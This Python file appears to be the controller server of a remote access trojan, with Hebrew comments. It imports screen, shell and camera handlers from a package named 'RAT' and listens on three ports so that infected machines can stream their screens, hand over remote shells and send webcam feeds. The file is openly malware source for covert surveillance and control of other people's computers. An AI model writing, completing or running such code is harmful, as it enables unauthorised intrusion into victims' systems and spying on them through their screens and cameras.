import socket
import threading
import time
from RAT.handlers.screen_handler import screen_handler
from RAT.handlers.shell_handler import shell_handler
from RAT.handlers.camera_handler import camera_handler
PORT_SCREEN = 9999
PORT_SHELL = 9998
PORT_CAMERA = 9996

IP = "0.0.0.0"


def start_server():
    # יצירת שרת לשידור מסך
    screen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    screen_socket.bind((IP, PORT_SCREEN))
    screen_socket.listen(5)
    print(f"[SERVER] מחכה לחיבורים למסך ב-{IP}:{PORT_SCREEN}")

    # יצירת שרת ל-Shell
    shell_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    shell_socket.bind((IP, PORT_SHELL))
    shell_socket.listen(5)
    print(f"[SERVER] מחכה לחיבורים ל-SHELL ב-{IP}:{PORT_SHELL}")

    camera_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    camera_socket.bind((IP, PORT_CAMERA))
    camera_socket.listen(5)
    print(f"[SERVER] ממתין לחיבורי מצלמה ב-{IP}:{PORT_CAMERA}")

    def accept_clients(server_socket, handler):
        while True:
            client_sock, addr = server_socket.accept()
            threading.Thread(target=handler, args=(client_sock, addr), daemon=True).start()

    threading.Thread(target=accept_clients, args=(screen_socket, screen_handler), daemon=True).start()
    threading.Thread(target=accept_clients, args=(shell_socket, shell_handler), daemon=True).start()
    threading.Thread(target=accept_clients, args=(camera_socket, camera_handler), daemon=True).start()

    # שמירה על הריצה
    while True:
        time.sleep(1)

